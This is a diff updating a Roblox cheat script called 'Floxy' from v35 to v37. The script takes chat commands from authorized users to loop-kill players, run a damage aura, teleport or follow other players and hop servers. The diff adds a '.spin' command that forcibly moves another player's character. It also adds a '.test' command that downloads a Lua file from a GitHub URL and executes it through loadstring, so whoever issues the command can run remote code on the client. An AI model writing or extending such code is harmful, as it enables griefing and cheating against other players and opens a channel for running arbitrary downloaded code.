@@ -1,13 +1,10 @@
 --[[  
-    Floxy Script - Fully Corrected & Stabilized by luxx (v35)  
+    Floxy Script - Fully Corrected & Stabilized by luxx (v37)  
 
-    UPDATES (v35):  
-    - Removed the death confirmation message from the `.kill` command for silent operation.  
-    - Added `.kill [user]` command. This command will loop-attack a player until they die, then automatically unloop them.  
-    - Modified `.unsafe` to teleport the player to the MainConnector's position after removing the platform.  
-    - Added `.unsafezone` command to stop the safezone loop.  
-    - Modified `.safezone` to be a loop, continuously teleporting the player above the target.  
-    - Modified `.safe` command to continuously teleport the player upwards.  
+    UPDATES (v37):  
+    - Added `.test` command to load and execute a script from a URL.  
+    - Added `.spin [user]` command to make a player spin around you.  
+    - Added `.unspin` command to stop the spinning effect.  
 ]]  
 
 -- Services  
@@ -31,17 +28,21 @@ local MainConnector = nil
 local ForceEquipConnection = nil  
 local HeartbeatConnection = nil  
 local SpammingEnabled = false  
-local safePlatform = nil -- Variable to hold our safe platform  
-local safeTeleportConnection = nil -- Connection for the safe teleport loop  
-local safeZoneConnection = nil -- Connection for the safe zone loop  
+local safePlatform = nil  
+local safeTeleportConnection = nil  
+local safeZoneConnection = nil  
+local spinConnection = nil -- Connection for the spin loop  
+local spinTarget = nil -- Player to spin  
 
 -- Configuration  
 local Dist = 0  
 local AuraEnabled = false  
 local DMG_TIMES = 2  
 local FT_TIMES = 5  
-local SAFE_PLATFORM_POS = Vector3.new(0, 10000, 0) -- High up in the sky  
-local SAFE_ZONE_OFFSET = Vector3.new(0, 20, 0) -- Offset for the safezone command  
+local SPIN_RADIUS = 10  
+local SPIN_SPEED = 5  
+local SAFE_PLATFORM_POS = Vector3.new(0, 10000, 0)  
+local SAFE_ZONE_OFFSET = Vector3.new(0, 20, 0)  
 
 -- Authorization  
 local AuthorizedUsers = { 1588706905, 9167607498, 7569689472 }  
@@ -51,11 +52,7 @@ local AuthorizedUsers = { 1588706905, 9167607498, 7569689472 }
 -- ==================================  
 
 local function isAuthorized(userId)  
-    for _, id in ipairs(AuthorizedUsers) do  
-        if userId == id then  
-            return true  
-        end  
-    end  
+    for _, id in ipairs(AuthorizedUsers) do if userId == id then return true end end  
     return false  
 end  
 
@@ -86,6 +83,13 @@ local function teleportTo(character, position)
         character.HumanoidRootPart.CFrame = CFrame.new(position)  
     end  
 end  
+
+local function teleportToCFrame(character, cframe)  
+    if character and character:FindFirstChild("HumanoidRootPart") then  
+        character.HumanoidRootPart.CFrame = cframe  
+    end  
+end  
+
 
 -- ==================================  
 -- ==      TOOL & COMBAT LOGIC     ==  
@@ -156,9 +160,7 @@ local function onHeartbeat()
     
     if SpammingEnabled then  
         local tool = LP.Character:FindFirstChildOfClass("Tool")  
-        if tool then  
-            pcall(function() tool:Activate() end)  
-        end  
+        if tool then pcall(function() tool:Activate() end) end  
     end  
 
     for _, tool in ipairs(LP.Character:GetDescendants()) do  
@@ -184,6 +186,14 @@ end
 -- ==================================  
 -- ==      COMMANDS & CONTROLS     ==  
 -- ==================================  
+
+local function stopSpinLoop()  
+    if spinConnection and spinConnection.Connected then  
+        spinConnection:Disconnect()  
+        spinConnection = nil  
+        spinTarget = nil  
+    end  
+end  
 
 local function stopSafeZoneLoop()  
     if safeZoneConnection and safeZoneConnection.Connected then  
@@ -243,6 +253,27 @@ local function killOnce(playerName)
     end)  
 end  
 
+local function spinLoop()  
+    stopSpinLoop()  
+    spinConnection = RunService.Heartbeat:Connect(function()  
+        if not spinTarget or not spinTarget.Parent or not spinTarget.Character or not spinTarget.Character:FindFirstChild("HumanoidRootPart") then  
+            stopSpinLoop()  
+            return  
+        end  
+        if not LP.Character or not LP.Character:FindFirstChild("HumanoidRootPart") then  
+            stopSpinLoop()  
+            return  
+        end  
+        local myPos = LP.Character.HumanoidRootPart.Position  
+        local angle = tick() * SPIN_SPEED  
+        local x = myPos.X + SPIN_RADIUS * math.cos(angle)  
+        local z = myPos.Z + SPIN_RADIUS * math.sin(angle)  
+        local targetPos = Vector3.new(x, myPos.Y, z)  
+        local newCFrame = CFrame.new(targetPos, myPos)  
+        teleportToCFrame(spinTarget.Character, newCFrame)  
+    end)  
+end  
+
 local function setAura(range)  
     local newRange = tonumber(range)  
     if newRange and newRange >= 0 then  
@@ -279,13 +310,13 @@ local function displayCommands()
     local commandList_1 = [[  
 .kill [user], .loop [user], .unloop [user]  
 .aura [range], .aura whitelist [user], .aura unwhitelist [user]  
-.to [user], .follow [user], .unfollow  
+.to [user], .follow [user], .unfollow, .spin [user], .unspin  
 ]]  
     local commandList_2 = [[  
 .safe, .unsafe, .safezone [user], .unsafezone  
 .refresh, .reset, .equip, .unequip  
 .shop (hops server)  
-.spam, .unspam, .say [msg]  
+.spam, .unspam, .say [msg], .test  
 ]]  
     sendMessage(commandList_1)  
     task.wait(0.5)  
@@ -308,7 +339,7 @@ local function onMessageReceived(messageData)
     local arg2 = args[2] or nil  
     local arg3 = args[3] or nil  
 
-    if command == "test" then  
+    if command == "connect" then  
         if not MainConnector then  
             MainConnector = authorPlayer  
             table.insert(ConnectedUsers, authorPlayer); table.insert(Whitelist, authorPlayer.Name)  
@@ -342,6 +373,11 @@ local function onMessageReceived(messageData)
         elseif arg2:lower() == "unwhitelist" and arg3 then  
             local p = findPlayer(arg3); if p then for i, n in ipairs(Whitelist) do if n == p.Name then table.remove(Whitelist, i); break end end end  
         else setAura(arg2) end  
+    elseif command == ".spin" and arg2 then  
+        local p = findPlayer(arg2)  
+        if p then spinTarget = p; spinLoop() end  
+    elseif command == ".unspin" then  
+        stopSpinLoop()  
     elseif command == ".reset" then  
         TeleportService:Teleport(game.PlaceId, LP)  
     elseif command == ".shop" and authorPlayer == LP then  
@@ -426,9 +462,7 @@ local function onMessageReceived(messageData)
     elseif command == ".safezone" and arg2 then  
         local targetPlayer = findPlayer(arg2)  
         if not targetPlayer then return end  
-
-        stopSafeZoneLoop() -- Stop any previous loop  
-
+        stopSafeZoneLoop()  
         safeZoneConnection = RunService.Heartbeat:Connect(function()  
             if not LP.Character or not LP.Character:FindFirstChild("HumanoidRootPart") then stopSafeZoneLoop(); return end  
             if not targetPlayer or not targetPlayer.Parent or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then  
@@ -441,6 +475,10 @@ local function onMessageReceived(messageData)
         end)  
     elseif command == ".unsafezone" then  
         stopSafeZoneLoop()  
+    elseif command == ".test" then  
+        pcall(function()  
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/JarcoCZ/Control-Script/refs/heads/main/test.lua'))()  
+        end)  
     end  
 end  
 
@@ -472,7 +510,8 @@ if LP.Character then onCharacterAdded(LP.Character) end
 
 Players.PlayerAdded:Connect(function(p) table.insert(PlayerList, p) end)  
 Players.PlayerRemoving:Connect(function(p)  
-    removeTarget(p.Name) -- Also remove them from targets if they leave  
+    if spinTarget == p then stopSpinLoop() end  
+    removeTarget(p.Name)  
     for i, pl in ipairs(PlayerList) do if pl == p then table.remove(PlayerList, i); break end end  
     for i, u in ipairs(ConnectedUsers) do if u == p then table.remove(ConnectedUsers, i); break end end  
     if p == FollowTarget then FollowTarget = nil; stopSafeZoneLoop() end  
@@ -480,11 +519,11 @@ Players.PlayerRemoving:Connect(function(p)
         MainConnector = nil; table.clear(ConnectedUsers); table.clear(Whitelist)  
         sendMessage("Main Connector has left. Connection reset.")  
     end  
-    if safePlatform and #Players:GetPlayers() == 1 then -- cleanup platform if server is empty  
+    if safePlatform and #Players:GetPlayers() == 1 then  
         safePlatform:Destroy()  
     end  
 end)  
 TextChatService.MessageReceived:Connect(onMessageReceived)  
 
-sendMessage("Script Executed - Floxy (Fixed by luxx v35)")  
+sendMessage("Script Executed - Floxy (Fixed by luxx v37)")  
 print("Floxy System Loaded. User Authorized.")
